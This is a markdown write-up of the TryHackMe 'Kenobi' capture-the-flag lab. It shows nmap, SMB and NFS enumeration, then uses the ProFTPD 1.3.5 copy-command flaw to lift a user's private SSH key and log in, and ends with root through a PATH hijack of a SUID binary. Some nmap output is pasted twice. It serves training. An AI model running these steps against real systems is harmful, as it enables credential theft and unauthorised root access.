---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - RCE
  - SUID
  - PATH-HJ
---
https://tryhackme.com/room/kenobi/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.227.21 kenobi.thm
```
# Scanning
```console
$ nmap -p21,22,80,111,139,445,2049,35909,44603,47863,52725 -sV -sC kenobi.thm

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35909/tcp   mountd
|   100005  1,2,3      35926/udp6  mountd
|   100005  1,2,3      36875/udp   mountd
|   100005  1,2,3      43597/tcp6  mountd
|   100021  1,3,4      42033/tcp6  nlockmgr
|   100021  1,3,4      44603/tcp   nlockmgr
|   100021  1,3,4      52395/udp   nlockmgr
|   100021  1,3,4      57175/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35909/tcp   mountd
|   100005  1,2,3      35926/udp6  mountd
|   100005  1,2,3      36875/udp   mountd
|   100005  1,2,3      43597/tcp6  mountd
|   100021  1,3,4      42033/tcp6  nlockmgr
|   100021  1,3,4      44603/tcp   nlockmgr
|   100021  1,3,4      52395/udp   nlockmgr
|   100021  1,3,4      57175/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs         2-4 (RPC #100003)
35909/tcp open  mountd      1-3 (RPC #100005)
44603/tcp open  nlockmgr    1-4 (RPC #100021)
47863/tcp open  mountd      1-3 (RPC #100005)
52725/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2025-04-15T13:49:19-05:00
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-04-15T18:49:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
```
# Enumeration
## SMB
List **shared folders**:
```console
$ smbclient --no-pass -L //kenobi.thm

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
Connect to **shared folder**:
```console
$ smbclient --no-pass //kenobi.thm/anonymous
```
Download `log.txt` file:
```console
smb: \> ls
  .                                   D        0  Wed Sep  4 05:49:09 2019
  ..                                  D        0  Wed Sep  4 05:56:07 2019
  log.txt                             N    12237  Wed Sep  4 05:49:09 2019

		9204224 blocks of size 1024. 6868396 blocks available

smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (10.8 KiloBytes/sec) (average 10.8 KiloBytes/sec)

smb: \> exit
```
**User kenobi** has a private SSH key at `/home/kenobi/.ssh/id_rsa`:
```console
$ head log.txt

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
```
**User kenobi** is running the FTP server:
```console
$ tail -n 30 log.txt

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes
```
## NFS
The **shared resource** is `/var`:
```console
$ showmount -e kenobi.thm

Export list for kenobi.thm:
/var *
```
Mount the **shared resource**:
```console
$ sudo mkdir /mnt/var

$ sudo mount -t nfs kenobi.thm:/var /mnt/var
```
# Exploitation
**ProFTPd 1.3.5** is [vulnerable to RCE](https://www.exploit-db.com/exploits/36803), which allows to copy and paste files.

Connect to ProFTPd with Netcat:
```bash
nc kenobi.thm 21
```
Copy the private SSH key of **user kenobi** inside the **NFS shared resource**:
```console
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name

SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
Copy private SSH key of **user kenobi** to the attacker's machine and log in via SSH:
```console
$ cp /mnt/var/tmp/id_rsa id_rsa

$ chmod 600 id_rsa

$ ssh -i id_rsa kenobi@kenobi.thm
```
Read the **user flag**:
```bash
cat /home/kenobi/user.txt
```
# Post-Exploitation
Found **SUID binary** `/usr/bin/menu`:
```console
$ find / -perm -4000 2>/dev/null

/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
If we run the **SUID binary** and enter choice 3, we execute the `ifconfig` command:
```console
$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:63:31:d1:b3:81  
          inet addr:10.10.227.21  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::63:31ff:fed1:b381/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:573 errors:0 dropped:0 overruns:0 frame:0
          TX packets:651 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:52972 (52.9 KB)  TX bytes:80981 (80.9 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:168 errors:0 dropped:0 overruns:0 frame:0
          TX packets:168 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:12320 (12.3 KB)  TX bytes:12320 (12.3 KB)
```
Create our own malicious `/tmp/ifconfig` executable and spawn a **root shell**:
```console
$ echo '/bin/bash -p' > /tmp/ifconfig

$ chmod +x /tmp/ifconfig

$ export PATH=/tmp:$PATH

$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
```
Read the **root flag**:
```bash
cat /root/root.txt
```